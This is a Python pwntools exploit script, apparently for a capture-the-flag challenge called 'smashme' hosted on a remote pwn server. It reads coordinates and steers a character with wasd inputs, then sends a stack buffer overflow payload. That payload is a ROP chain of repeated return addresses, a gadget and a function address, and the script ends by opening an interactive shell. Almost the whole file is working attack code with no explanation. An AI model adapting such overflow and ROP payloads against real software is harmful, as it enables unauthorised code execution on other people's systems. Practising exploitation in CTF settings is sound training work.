from pwn import *

#s = process("./smashme")
s = remote("pwn.kysis.kr",5553)
context.log_level = 'debug'
s.recvuntil("user x : ")

user_x=int(s.recvuntil(",")[:-1])
s.recvuntil("y : ")
user_y=int(s.recvuntil("\n")[:-1])

log.success("user_x : "+str(user_x)+" user_y : "+str(user_y))

s.recvuntil("goal x : ")
goal_x=int(s.recvuntil(",")[:-1])
s.recvuntil("y : ")
goal_y=int(s.recv())

log.success("goal_x : " + str(goal_x) + " goal_y : "+str(goal_y))

s.send("\n")

if (user_x > goal_x):
    for i in range(user_x - goal_x):
        s.send("a")


if (user_x < goal_x):
    for i in range(goal_x - user_x):
        s.send("d")

if (user_y > goal_y):
    for i in range(user_y - goal_y):
        s.send("w")

if (user_y < goal_y):
    for i in range(goal_y - user_y):
        s.send("s")

s.recvuntil(">>> ")

#payload = "A"*112
'''
payload += p64(0x00401513)
payload += p64(0x602100)
payload += p64(0x400c20)
'''
payload = p64(0x4012B8)*16
payload += p64(0x00401513)
payload += p64(0x602100)
payload += p64(0x400c20)
s.sendline(payload)

s.interactive()
